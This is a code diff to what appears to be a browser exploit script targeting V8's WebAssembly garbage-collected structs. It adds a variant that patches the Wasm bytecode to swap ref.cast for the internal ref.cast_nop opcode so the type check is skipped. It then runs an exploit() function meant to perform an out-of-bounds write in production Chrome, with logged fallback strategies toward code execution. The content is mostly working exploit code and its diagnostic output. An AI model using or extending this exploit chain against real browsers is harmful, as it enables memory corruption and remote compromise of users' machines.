@@ -199,6 +199,23 @@ function buildWasmBytes() {
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
+// Variant: replace ref.cast (0xFB 0x16) with ref.cast_nop (0xFB 0x4C).
+// ref.cast_nop is V8's internal opcode that reinterprets the type annotation
+// WITHOUT emitting a runtime map check (AnnotateWasmType instead of WasmTypeCastOp).
+// If V8's validator allows it from user Wasm bytes → struct.set OOB with no flags.
+function buildWasmBytesNop() {
+  const b = buildWasmBytes().slice();
+  // Patch the single ref.cast (0xFB 0x16 0x01) → ref.cast_nop (0xFB 0x4C 0x01)
+  for (let i = 0; i < b.length - 2; i++) {
+    if (b[i] === 0xFB && b[i+1] === 0x16 && b[i+2] === 0x01) {
+      b[i+1] = 0x4C;
+      break;
+    }
+  }
+  return b;
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
 // Struct memory layout (V8 Wasm GC heap, 64-bit):
 //
 //   SmallStruct (type 0):
@@ -363,6 +380,51 @@ async function main() {
     } else {
       log('  [?] Exception: ' + msg);
     }
+  }
+
+  // ── Phase 3b: ref.cast_nop — V8 internal opcode bypass attempt ──────────────
+  // ref.cast_nop (0xFB 0x4C) skips the map check entirely in TurboShaft:
+  //   ref.cast   → emits WasmTypeCastOp → runtime map comparison → TRAP if mismatch
+  //   ref.cast_nop → emits AnnotateWasmType → pure annotation, zero runtime cost
+  // If V8's validator accepts this opcode from user-provided Wasm bytes, the
+  // struct.set OOB executes directly in production Chrome with NO extra primitives.
+  log('\n[Phase 3b] ref.cast_nop (0xFB 0x4C) — V8 internal opcode bypass');
+  log('  [*] Patching binary: ref.cast → ref.cast_nop in exploit body...');
+  try {
+    const bytesNop = buildWasmBytesNop();
+    const modNop = await iframeWebAssembly.compile(bytesNop);
+    log('  [+] !! ref.cast_nop ACCEPTED by V8 validator !!');
+    log('      Opcode 0xFB 0x4C is accessible from user Wasm bytes!');
+    const importsNop = {
+      i: { t: iframeJSTag, f: () => { throw crafted; } }
+    };
+    const instNopR = await iframeWebAssembly.instantiate(modNop, importsNop);
+    const instNop  = instNopR.exports ? instNopR : instNopR.instance;
+    try {
+      instNop.exports.exploit();
+      log('  [!] ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+      log('  [!] PRODUCTION OOB WRITE — no flags, no canonical_type_ corruption!');
+      log('  [!] ref.cast_nop bypassed map check → struct.set OOB silent.');
+      log('  [!] 0x41414141 written to SmallStruct_base + 36 in production.');
+      log('  [!] ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+    } catch (e2) {
+      const m2 = (e2 && e2.message) ? e2.message : String(e2);
+      const isCast2 = m2.includes('cast') || m2.includes('illegal') || m2.includes('ref');
+      if (isCast2) {
+        log('  [?] cast_nop compiled but exploit() still trapped: ' + m2);
+        log('      V8 may lower ref.cast_nop to a check at a later pass.');
+      } else {
+        log('  [?] exploit() threw after cast_nop: ' + m2);
+      }
+    }
+  } catch (e) {
+    const m = (e && e.message) ? e.message : String(e);
+    log('  [-] ref.cast_nop rejected: ' + m);
+    log('  [-] V8 does not expose opcode 0xFB 0x4C to user Wasm code.');
+    log('  [!] Direct bypass blocked — production write path summary:');
+    log('  [!]   Option A: canonical_type_ corruption (F1) + WasmGCTypedOptimizer (F4)');
+    log('  [!]   Option B: separate in-cage OOB primitive to forge map pointer');
+    log('  [!]   Both eliminate ref.cast map check → struct.set OOB (F5) silent.');
   }
 
   // ── Phase 4: RCE path analysis ────────────────────────────────────────────
